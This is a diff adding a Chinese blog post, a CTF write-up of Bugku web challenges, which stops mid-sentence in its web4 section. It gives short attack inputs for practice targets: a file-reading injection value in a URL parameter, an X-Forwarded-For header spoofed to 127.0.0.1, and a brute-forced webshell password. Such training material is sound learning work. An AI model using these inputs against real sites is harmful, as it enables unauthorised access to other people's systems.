@@ -1,0 +1,623 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/16x16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    hostname: new URL('http://yoursite.com').hostname,
+    root: '/',
+    scheme: 'Pisces',
+    version: '7.7.1',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    comments: {"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}
+  };
+</script>
+
+  <meta name="description" content="刷题~~">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Bugku web1">
+<meta property="og:url" content="http://yoursite.com/2020/02/03/CTF%20WP/Bugku%20web1/index.html">
+<meta property="og:site_name" content="ChanCherry&#39;s Blog">
+<meta property="og:description" content="刷题~~">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190925160944472.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190925165210596.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191007173631371.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191007181827543.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191007181707416.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191007182415172.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191007183852746.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191007185234724.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191007195614561.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191007195552692.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191007201921636.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191007202102143.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191007202717707.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191007202729855.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191007202910510.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191007205113319.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2019100720512637.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191007205138260.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191007205224534.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191007205357743.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191007205628603.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2019100720580134.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191007210514665.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191007211514563.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191007230815542.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190928192246621.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190928192226667.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190928192351568.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190928231951267.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190928232354686.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190928232949394.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190928232917309.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191008122607490.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191008123326714.png">
+<meta property="article:published_time" content="2020-02-02T16:00:00.000Z">
+<meta property="article:modified_time" content="2020-02-03T09:07:38.448Z">
+<meta property="article:author" content="ChanCherry">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20190925160944472.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70">
+
+<link rel="canonical" href="http://yoursite.com/2020/02/03/CTF%20WP/Bugku%20web1/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>Bugku web1 | ChanCherry's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="ChanCherry's Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ChanCherry's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">信安萌新，CTFer</p>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/03/CTF%20WP/Bugku%20web1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="ChanCherry">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ChanCherry's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Bugku web1
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-02-03 00:00:00 / 修改时间：17:07:38" itemprop="dateCreated datePublished" datetime="2020-02-03T00:00:00+08:00">2020-02-03</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF-WP/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF WP</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>刷题~~</p>
+<a id="more"></a>
+
+<h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><p>一打开网页，好多表情朝你涌来，不管那么多，F12查看一下，就会看到flag。</p>
+<h1 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h1><p>F12查看一下源码<br><img src="https://img-blog.csdnimg.cn/20190925160944472.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h1 id="web基础-GET"><a href="#web基础-GET" class="headerlink" title="web基础$_GET"></a>web基础$_GET</h1><p>url传入<code>?what=flag</code><br><img src="https://img-blog.csdnimg.cn/20190925165210596.png" alt="在这里插入图片描述"></p>
+<h1 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$num=$_GET[<span class="string">'num'</span>];</span><br><span class="line"><span class="keyword">if</span>(!is_numeric($num))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> $num;</span><br><span class="line"><span class="keyword">if</span>($num==<span class="number">1</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'flag&#123;**********&#125;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>审计一下代码，需要传入一个num，但是num不能是数字，后面却又要num=1，才能输出flag。用num=1’绕过了。</p>
+<h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><p>查看源代码，发现底部一串unicode编码应该是flag，<a href="http://tool.chinaz.com/tools/unicode.aspx" target="_blank" rel="noopener">解码一下</a><br><img src="https://img-blog.csdnimg.cn/20191007173631371.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h1 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h1><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">听说把 <span class="selector-tag">flag</span><span class="selector-class">.baidu</span><span class="selector-class">.com</span> 解析到123<span class="selector-class">.206</span><span class="selector-class">.87</span><span class="selector-class">.240</span> 就能拿到<span class="selector-tag">flag</span></span><br></pre></td></tr></table></figure>
+<p>以管理员身份打开Power并在窗口输入notepad hosts修改hosts文件，在最后加上<code>123.206.87.240   flag.baidu.com</code><br><img src="https://img-blog.csdnimg.cn/20191007181827543.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20191007181707416.png" alt="在这里插入图片描述"><br>浏览器直接访问flag.baidu.com ，即可得到flag</p>
+<h1 id="你必须让它停下"><a href="#你必须让它停下" class="headerlink" title="你必须让它停下"></a>你必须让它停下</h1><p><img src="https://img-blog.csdnimg.cn/20191007182415172.png" alt="在这里插入图片描述"><br>用burpsuite抓包，send to repeater好几次，就能在response里面看到flag<br><img src="https://img-blog.csdnimg.cn/20191007183852746.png" alt="在这里插入图片描述"></p>
+<h1 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h1><p>url加上<code>?hello=file(%22flag.php%22)</code>访问即可得flag<br><img src="https://img-blog.csdnimg.cn/20191007185234724.png" alt="在这里插入图片描述"></p>
+<h1 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">flag In the variable ! <span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag1.php"</span>;</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'args'</span>]))&#123;</span><br><span class="line">    $args = $_GET[<span class="string">'args'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/^\w+$/"</span>,$args))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"args error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">"var_dump($$args);"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>利用超全局数组GLOBALS可以打印出所有变量</p>
+<h1 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h1><p>查看源代码，[][(![]+[])[+[]]其实特别长，复制一下放到Google控制台运行，<br><img src="https://img-blog.csdnimg.cn/20191007195614561.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20191007195552692.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">根据提示，改成大写。</p>
+<h1 id="头等舱"><a href="#头等舱" class="headerlink" title="头等舱"></a>头等舱</h1><p>burpsuite抓包<br><img src="https://img-blog.csdnimg.cn/20191007201921636.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h1 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h1><p><img src="https://img-blog.csdnimg.cn/20191007202102143.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开链接是一个黑页，链接后面加index.php判断是PHP，而题目提示实战中经常遇到，那就开御剑扫描后台吧<br><img src="https://img-blog.csdnimg.cn/20191007202717707.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20191007202729855.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">webshell就是以asp、php、<span class="keyword">jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。</span></span><br><span class="line"><span class="keyword">黑客在入侵了一个网站后，通常会将asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起，</span></span><br><span class="line"><span class="keyword">然后就可以使用浏览器来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。</span></span><br><span class="line"><span class="keyword">顾名思义，"web"的含义是显然需要服务器开放web服务，"shell"的含义是取得对服务器某种程度上操作权限。</span></span><br><span class="line"><span class="keyword">webshell常常被称为入侵者通过网站端口对网站服务器的某种程度上操作的权限。</span></span><br><span class="line"><span class="keyword">由于webshell其大多是以动态脚本的形式出现，也有人称之为网站的后门工具。</span></span><br></pre></td></tr></table></figure>
+
+<p>扫到shell.php，访问一下，<br><img src="https://img-blog.csdnimg.cn/20191007202910510.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>用burp爆破，<br><img src="https://img-blog.csdnimg.cn/20191007205113319.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2019100720512637.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20191007205138260.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现hack的长度和别的不一样<br><img src="https://img-blog.csdnimg.cn/20191007205224534.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入密码得到flag<br><img src="https://img-blog.csdnimg.cn/20191007205357743.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h1 id="管理员系统"><a href="#管理员系统" class="headerlink" title="管理员系统"></a>管理员系统</h1><p><img src="https://img-blog.csdnimg.cn/20191007205628603.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>随便输了进去，<br><img src="https://img-blog.csdnimg.cn/2019100720580134.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>联想到X-Forwarded-For，简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP 。可以伪造一个XFF头，伪装成本地登录。</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br></pre></td></tr></table></figure>
+<p>再看看源码，在最底下有一串编码<code>dGVzdDEyMw==</code>，解出来是test123，应该是管理员密码。<br>用burp抓包，记得加上XFF头，response里面找到flag。<br><img src="https://img-blog.csdnimg.cn/20191007210514665.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h1 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>BKCTF-WEB4<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"display:none;"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"index.php"</span> <span class="attr">method</span>=<span class="string">"post"</span> &gt;</span></span><br><span class="line">看看源代码？<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> p1 = <span class="string">'%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74%28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29%3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70%65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62'</span>;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> p2 = <span class="string">'%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d%3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72%74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72%65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75%65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b'</span>;</span></span><br><span class="line"><span class="javascript"><span class="built_in">eval</span>(<span class="built_in">unescape</span>(p1) + <span class="built_in">unescape</span>(<span class="string">'%35%34%61%61%32'</span> + p2));</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"input"</span> <span class="attr">name</span>=<span class="string">"flag"</span> <span class="attr">id</span>=<span class="string">"flag"</span> /&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>用burpsuite里面的decoder进行url解密，注意第二个字符串要加上<code>%35%34%61%61%32</code>再解密，把两段合在一起就是</p>
